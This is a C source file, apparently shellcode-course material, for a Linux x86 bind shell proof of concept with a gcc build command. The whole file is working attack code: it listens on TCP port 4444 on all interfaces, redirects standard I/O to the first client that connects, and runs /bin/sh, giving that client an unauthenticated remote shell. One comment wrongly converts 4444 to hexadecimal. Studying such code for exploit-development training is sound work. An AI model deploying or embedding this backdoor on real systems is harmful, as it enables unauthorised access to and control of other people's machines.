/*

Executable name	: bind-poc
Designed OS	: Linux x86
Author		: wetw0rk
Description	: bind shell written in C. This is a proof of
		  concept of what we want to accomplish in our
		  shellcode. Heavily commented code below.

Build using these commands:
	gcc -o bind-poc bind-poc.c

*/

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main()
{
	/*
	sock_fd	: socket descriptor for server
	clnt_fd	: socket descriptor for client
	loop	: Used for loop of three I/O connections (STDIN,STDOUT,STDERR)
	server	: server address
	client	: client address
	slen	: socket length for new connections
	*/
	int sock_fd, clnt_fd, loop, slen;
	struct sockaddr_in server, client;

	/*
	AF_INET 	: address family		= 2
	4444		: port to bind to		= 0x17476
	INADDR_ANY	: listen on all interfaces	= 0
	*/
	server.sin_family = AF_INET;
	server.sin_port = htons(4444);
	server.sin_addr.s_addr = htonl (INADDR_ANY);

	/*
	AF_INET		: address family	= 2
	SOCK_STREAM	: tcp connection	= 1
	IPPROTO_IP	: dummy of ip		= 0
	*/
	sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

	// bind
	bind(sock_fd,(struct sockaddr *)&server, sizeof(server));

	// listen for incoming connections (handle up to 3)
	listen(sock_fd, 3);

	// accept new connections
	slen = sizeof(struct sockaddr_in);
	clnt_fd = accept(sock_fd, (struct sockaddr *)&client, (socklen_t*)&slen);

	/*
	dup2(clnt_fd, 0)	: STDIN		= 0
	dup2(clnt_fd, 1)	: STDOUT	= 1
	dup2(clnt_fd, 2)	: STDERR	= 2
	*/
	for(loop = 0; loop <= 2; loop++)
	{
		dup2(clnt_fd, loop);
	}

	// use /bin/sh shell
	execve("/bin/sh", NULL, NULL);

}
